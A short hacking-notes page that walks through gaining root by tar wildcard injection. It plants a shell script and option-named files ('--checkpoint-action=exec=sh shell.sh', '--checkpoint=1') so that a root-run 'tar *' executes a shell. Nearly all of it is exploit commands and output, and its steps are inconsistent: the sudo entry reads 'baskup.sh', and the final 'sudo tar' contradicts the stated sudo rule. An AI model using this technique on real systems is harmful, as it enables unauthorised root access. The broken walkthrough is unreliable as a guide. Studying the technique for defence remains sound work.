# Tar Wildcard Injection PrivEsc

The `tar` command with wildcard injection may lead to privilege escalation (PrivEsc).

### Investigation <a href="#investigation" id="investigation"></a>

For example, below command can be executed as root.

```shellscript
sudo -l

(root) NOPASSWD: /opt/backup/baskup.sh
```

#### Check If the File Contains Tar Command with Wildcards <a href="#check-if-the-file-contains-tar-command-with-wildcards" id="check-if-the-file-contains-tar-command-with-wildcards"></a>

We need to check the content in the file.

```shellscript
cat /opt/backup/backup.sh

# -cf: create an archived file
tar -cf backup.tar *
```

The above **tar** command means that it creates an arvhived file from any input file because it passes **wildcard (\*)**.

### Exploitation <a href="#exploitation" id="exploitation"></a>

Now create a payload for privilege escalation.

```shellscript
cd /opt/backup
echo -e '#!/bin/bash\n/bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

We've created three files.

```shellscript
ls /opt/backup

shell.sh  '--checkpoint-action=exec=sh shell.sh'  '--checkpoint=1'
```

Now execute **"tar"** command as root with wildcard.

```shellscript
sudo tar -cf example.tar *
```

Wait until **"tar"** command will be executed.\
After a while, we should see the current user switch to root.

```shellscript
whoami
root
```
